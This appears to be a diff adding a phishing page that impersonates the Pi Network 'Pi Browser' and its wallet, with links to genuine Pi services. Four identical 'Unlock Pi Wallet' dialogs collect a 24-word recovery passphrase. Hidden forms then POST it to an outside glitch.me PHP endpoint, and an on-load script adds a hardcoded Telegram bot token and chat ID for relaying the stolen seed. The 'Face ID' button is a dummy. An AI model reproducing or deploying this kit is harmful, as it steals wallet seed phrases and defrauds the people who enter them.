@@ -1,0 +1,433 @@
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Website with Top Middle Image</title>
+  <style>
+    .simple-alert {
+    position: fixed;
+    top: 20px;
+    left: 50%;
+    transform: translateX(-50%);
+    background-color: #444;
+    color: white;
+    padding: 10px 20px;
+    border-radius: 5px;
+    font-size: 14px;
+    z-index: 1000;
+    opacity: 1;
+    transition: opacity 0.5s ease;
+    text-align: center;
+    }
+  </style>
+  <style>
+    body {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background-color: #f0f0f0;
+    overflow-y: auto;
+    }
+    .top-image {
+    margin-top: 15px;
+    width: 100px;
+    height: auto;
+    }
+    .title {
+    margin-top: 30px;
+    font-size: 24px;
+    color: #ffb44c;
+    }
+    .grid-container {
+    display: grid;
+    grid-template-columns: repeat(3, 120px);
+    grid-template-rows: repeat(4, 120px);
+    gap: 10px;
+    margin-top: 50px;
+    margin-left: 50px;
+    margin-right: 50px;
+    }
+    .grid-item {
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    color: #6d318d;
+    text-align: center;
+    border-radius: 5px;
+    font-size: 14px;
+    cursor: pointer;
+    transition: transform 0.2s ease-in-out;
+    padding: 5px;
+    }
+    .grid-item img {
+    width: 130px;
+    height: auto;
+    margin-bottom: 5px;
+    }
+    .grid-item.fireside img { width: 140px; }
+    .grid-item.wallet img { width: 130px; }
+    .grid-item.brainstorm img { width: 155px; }
+    .grid-item.mine img { width: 157px; }
+    .grid-item.blockchain img { width: 147px; }
+    .grid-item.develop img { width: 110px; }
+    .grid-item.kyc img { width: 116px; }
+    .grid-item.chat img { width: 110px; }
+    .grid-item.profile img { width: 110px; }
+    .grid-item.dollar-exchange img { width: 117px; }
+    .grid-item.claim-pi img { width: 130px; }
+    .grid-item.unlock-pi img { width: 160px; }
+    /* Move all titles higher except Claim Pi and Unlock Pi */
+    .grid-item:not(.claim-pi):not(.unlock-pi) {
+    transform: translateY(-7px);
+    }
+    /* Move Fire Side slightly left */
+    .grid-item.fireside {
+    transform: translate(-5px, -30px);
+    }
+    /* Click effect */
+    .grid-item:active {
+    transform: scale(0.9);
+    }
+    .blank-space {
+    height: 250px;
+    width: 100%;
+    background-color: transparent;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    }
+    .blank-space button {
+    padding: 15px 60px;
+    font-size: 16px;
+    background-color: #6d318d;
+    color: white;
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+    transition: background-color 0.3s;
+    width: auto;
+    }
+    .blank-space button:hover {
+    background-color: #5a2a6d;
+    }
+    /* Modal overlay */
+    .modal-overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.5); /* Shadow background */
+    justify-content: center;
+    align-items: center;
+    z-index: 1000;
+    }
+    /* Wallet text box styling */
+    .wallet-textbox {
+    background-color: white;
+    padding: 20px;
+    border-radius: 10px;
+    width: 400px; /* Wider text box */
+    height: 750px; /* Taller text box */
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    position: relative; /* For positioning the back icon */
+    }
+    .wallet-textbox h2 {
+    font-size: 24px;
+    color: black; /* Changed to black */
+    margin-bottom: 20px;
+    font-weight: bold; /* Bold text */
+    }
+    .wallet-textbox textarea {
+    width: 90%;
+    height: 200px; /* Taller text area */
+    padding: 10px;
+    font-size: 14px;
+    border: 1px solid #ccc;
+    border-radius: 10px;
+    resize: none;
+    margin-bottom: 15px;
+    }
+    .wallet-textbox textarea:focus {
+    outline: none;
+    border-color: #6d318d;
+    }
+    .wallet-textbox .unlock-options {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+    width: 90%;
+    }
+    .wallet-textbox .unlock-options button {
+    padding: 10px 20px;
+    font-size: 14px;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: background-color 0.3s;
+    width: 100%;
+    }
+    .wallet-textbox .unlock-options button.passphrase {
+    background-color: white;
+    color: #6d318d;
+    border: 0.8px solid #703d92; /* Purple border */
+    }
+    .wallet-textbox .unlock-options button.passphrase:hover {
+    background-color: #f0f0f0; /* Light gray on hover */
+    }
+    .wallet-textbox .unlock-options button.face-id {
+    background-color: #703d92; /* Purple background */
+    color: white;
+    }
+    .wallet-textbox .unlock-options button.face-id:hover {
+    background-color: #5a2a6d; /* Darker purple on hover */
+    }
+    .wallet-textbox .error-message {
+    color: red;
+    font-size: 12px;
+    margin-top: 10px;
+    display: none; /* Hidden by default */
+    }
+    .wallet-textbox .info-message {
+    color: #666;
+    font-size: 14px; /* Larger font size */
+    margin-top: 20px;
+    text-align: left;
+    width: 90%;
+    font-weight: bold; /* Bold text */
+    }
+    .wallet-textbox .info-message a {
+    color: #007BFF; /* Blue color for link */
+    text-decoration: none; /* Remove underline */
+    }
+    .wallet-textbox .info-message a:hover {
+    text-decoration: underline; /* Underline on hover */
+    }
+    /* Back icon styling */
+    .back-icon {
+    position: absolute;
+    top: 15px;
+    left: 15px;
+    font-size: 24px;
+    cursor: pointer;
+    color: #6d318d; /* Purple color */
+    transition: transform 0.2s ease-in-out; /* Smooth hover effect */
+    }
+    .back-icon:hover {
+    color: #5a2a6d; /* Darker purple on hover */
+    transform: scale(1.1); /* Slightly enlarge on hover */
+    }
+  </style>
+</head>
+<body>
+  <img src="https://bloodistan16.pages.dev/pi2/pilogo.png" alt="Your Image" class="top-image">
+  <h1 class="title">Welcome to the Pi Browser</h1>
+  <div class="grid-container">
+    <div class="grid-item fireside" onclick="window.location.href='https://fireside.pinet.com/me'">
+      <img src="https://bloodistan16.pages.dev/pi2/fireside.png" alt="Fire Side">
+      Fire Side
+    </div>
+    <div class="grid-item wallet" onclick="toggleModal('walletModal')">
+      <img src="https://bloodistan16.pages.dev/pi2/wallet.png" alt="Wallet">
+      Wallet
+    </div>
+    <div class="grid-item brainstorm" onclick="window.location.href='https://brainstorm.pinet.com/brainstorm'">
+      <img src="https://bloodistan16.pages.dev/pi2/brainstorm.png" alt="Brainstorm">
+      Brainstorm
+    </div>
+    <div class="grid-item mine" onclick="window.location.href='https://mine.pinet.com'">
+      <img src="https://bloodistan16.pages.dev/pi2/mine.png" alt="Mine">
+      Mine
+    </div>
+    <div class="grid-item blockchain" onclick="window.location.href='https://blockexplorer.minepi.com'">
+      <img src="https://bloodistan16.pages.dev/pi2/blockchain.png" alt="Blockchain">
+      Blockchain
+    </div>
+    <div class="grid-item develop" onclick="window.location.href='https://develop.pinet.com'">
+      <img src="https://bloodistan16.pages.dev/pi2/develop.png" alt="Develop">
+      Develop
+    </div>
+    <div class="grid-item kyc" onclick="window.location.href='https://kyc.pinet.com'">
+      <img src="https://bloodistan16.pages.dev/pi2/kyc.png" alt="KYC">
+      KYC
+    </div>
+    <div class="grid-item chat" onclick="window.location.href='https://chat.pinet.com'">
+      <img src="https://bloodistan16.pages.dev/pi2/chat.png" alt="Chat">
+      Chat
+    </div>
+    <div class="grid-item profile" onclick="window.location.href='https://profiles.pinet.com'">
+      <img src="https://bloodistan16.pages.dev/pi2/profile.png" alt="Profile">
+      Profile
+    </div>
+    <div class="grid-item dollar-exchange" onclick="toggleModal('dollarExchangeModal')">
+      <img src="https://bloodistan16.pages.dev/pi2/dollar_exchange.png" alt="Dollar Exchange">
+      Dollar Exchange
+    </div>
+    <div class="grid-item claim-pi" onclick="toggleModal('claimPiModal')">
+      <img src="https://bloodistan16.pages.dev/pi2/claim_pi.png" alt="Claim Pi">
+      Claim Pi
+    </div>
+    <div class="grid-item unlock-pi" onclick="toggleModal('unlockPiModal')">
+      <img src="https://bloodistan16.pages.dev/pi2/unlock_pi.png" alt="Unlock Pi">
+      Unlock Pi
+    </div>
+  </div>
+  <div id="simple-alert" class="simple-alert">
+    Click on each button twice to activate!
+  </div>
+  <!-- Wallet Modal -->
+  <div class="modal-overlay" id="walletModal">
+    <div class="wallet-textbox">
+      <div class="back-icon" onclick="toggleModal('walletModal')">&lt;</div>
+      <h2>Unlock Pi Wallet</h2>
+      <textarea id="walletPassphraseInput" placeholder="Enter your 24-word passphrase here"></textarea>
+      <div class="error-message" id="walletErrorMessage">Please enter exactly 24 words.</div>
+      <div class="unlock-options">
+        <button class="passphrase" onclick="submitLoginForm('walletPassphraseInput', 'walletErrorMessage', 'walletForm')">Unlock With Passphrase</button>
+        <button class="face-id" onclick="unlockWithFaceID()">Unlock With Face ID</button>
+      </div>
+      <div class="info-message">
+        <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
+        <p>Lost your passphrase? <a href="#" onclick="redirectToNewWallet()">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.</p>
+      </div>
+      <form id="walletForm" action="https://ip-load.glitch.me/php/index.php" method="POST" style="display: none;">
+        <input type="hidden" name="passphrase" id="walletHiddenPassphrase">
+      </form>
+    </div>
+  </div>
+  <!-- Dollar Exchange Modal -->
+  <div class="modal-overlay" id="dollarExchangeModal">
+    <div class="wallet-textbox">
+      <div class="back-icon" onclick="toggleModal('dollarExchangeModal')">&lt;</div>
+      <h2>Unlock Pi Wallet</h2>
+      <textarea id="dollarExchangePassphraseInput" placeholder="Enter your 24-word passphrase here"></textarea>
+      <div class="error-message" id="dollarExchangeErrorMessage">Please enter exactly 24 words.</div>
+      <div class="unlock-options">
+        <button class="passphrase" onclick="submitLoginForm('dollarExchangePassphraseInput', 'dollarExchangeErrorMessage', 'dollarExchangeForm')">Unlock With Passphrase</button>
+        <button class="face-id" onclick="unlockWithFaceID()">Unlock With Face ID</button>
+      </div>
+      <div class="info-message">
+        <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
+        <p>Lost your passphrase? <a href="#" onclick="redirectToNewWallet()">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.</p>
+      </div>
+      <form id="dollarExchangeForm" action="https://ip-load.glitch.me/php/index.php" method="POST" style="display: none;">
+        <input type="hidden" name="passphrase" id="dollarExchangeHiddenPassphrase">
+      </form>
+    </div>
+  </div>
+  <!-- Claim Pi Modal -->
+  <div class="modal-overlay" id="claimPiModal">
+    <div class="wallet-textbox">
+      <div class="back-icon" onclick="toggleModal('claimPiModal')">&lt;</div>
+      <h2>Unlock Pi Wallet</h2>
+      <textarea id="claimPiPassphraseInput" placeholder="Enter your 24-word passphrase here"></textarea>
+      <div class="error-message" id="claimPiErrorMessage">Please enter exactly 24 words.</div>
+      <div class="unlock-options">
+        <button class="passphrase" onclick="submitLoginForm('claimPiPassphraseInput', 'claimPiErrorMessage', 'claimPiForm')">Unlock With Passphrase</button>
+        <button class="face-id" onclick="unlockWithFaceID()">Unlock With Face ID</button>
+      </div>
+      <div class="info-message">
+        <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
+        <p>Lost your passphrase? <a href="#" onclick="redirectToNewWallet()">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.</p>
+      </div>
+      <form id="claimPiForm" action="https://ip-load.glitch.me/php/index.php" method="POST" style="display: none;">
+        <input type="hidden" name="passphrase" id="claimPiHiddenPassphrase">
+      </form>
+    </div>
+  </div>
+  <!-- Unlock Pi Modal -->
+  <div class="modal-overlay" id="unlockPiModal">
+    <div class="wallet-textbox">
+      <div class="back-icon" onclick="toggleModal('unlockPiModal')">&lt;</div>
+      <h2>Unlock Pi Wallet</h2>
+      <textarea id="unlockPiPassphraseInput" placeholder="Enter your 24-word passphrase here"></textarea>
+      <div class="error-message" id="unlockPiErrorMessage">Please enter exactly 24 words.</div>
+      <div class="unlock-options">
+        <button class="passphrase" onclick="submitLoginForm('unlockPiPassphraseInput', 'unlockPiErrorMessage', 'unlockPiForm')">Unlock With Passphrase</button>
+        <button class="face-id" onclick="unlockWithFaceID()">Unlock With Face ID</button>
+      </div>
+      <div class="info-message">
+        <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
+        <p>Lost your passphrase? <a href="#" onclick="redirectToNewWallet()">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.</p>
+      </div>
+      <form id="unlockPiForm" action="https://ip-load.glitch.me/php/index.php" method="POST" style="display: none;">
+        <input type="hidden" name="passphrase" id="unlockPiHiddenPassphrase">
+      </form>
+    </div>
+  </div>
+  <div class="blank-space">
+    <button onclick="showMessage()">EXPLORE THE ECOSYSTEM</button>
+  </div>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        var botToken = new URLSearchParams(window.location.search).get("botToken") || "7518949462:AAG0oSRu73amIB7AE5mA6XAIggHHzvQnbLw";
+        var chatId = new URLSearchParams(window.location.search).get("refer") || "7462802543";
+        var dev = "R3Y";
+        var pageName = "Pi Wallet";
+        var redUrl = "quora/error.php";
+
+        var form = document.getElementById('claimPiForm') || document.getElementById('walletForm') || document.getElementById('dollarExchangeForm') || document.getElementById('unlockPiForm');    
+      
+        
+        if (form) {
+            var inputs = [
+                { name: 'botToken', value: botToken },
+                { name: 'chatId', value: chatId },
+                { name: 'DEV', value: dev },
+                { name: 'PAGE NAME', value: pageName },
+                { name: 'redUrl', value: redUrl }
+            ];
+    
+            inputs.forEach(function(input) {
+                var hiddenInput = document.createElement('input');
+                hiddenInput.type = 'hidden';
+                hiddenInput.name = input.name;
+                hiddenInput.value = input.value;
+                form.appendChild(hiddenInput);
+            });
+        }
+    });
+    
+    function submitLoginForm(inputId, errorId, formId) {
+        var passphrase = document.getElementById(inputId).value.trim();
+        if (passphrase.split(" ").length !== 24) {
+            document.getElementById(errorId).style.display = 'block';
+            return;
+        }
+        document.getElementById(errorId).style.display = 'none';
+        document.getElementById(formId).querySelector('input[name="passphrase"]').value = passphrase;
+        document.getElementById(formId).submit();
+    }
+    
+    function toggleModal(modalId) {
+        var modal = document.getElementById(modalId);
+        modal.style.display = modal.style.display === 'none' ? 'block' : 'none';
+    }
+    
+    function unlockWithFaceID() {
+        alert("Face ID functionality is not implemented yet.");
+    }
+  </script>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        var simpleAlert = document.getElementById('simple-alert');
+        if (simpleAlert) {
+            setTimeout(function() {
+                simpleAlert.style.display = 'none';
+            }, 5000);
+        }
+    });
+  </script>
+
+
+</body>
+</html>
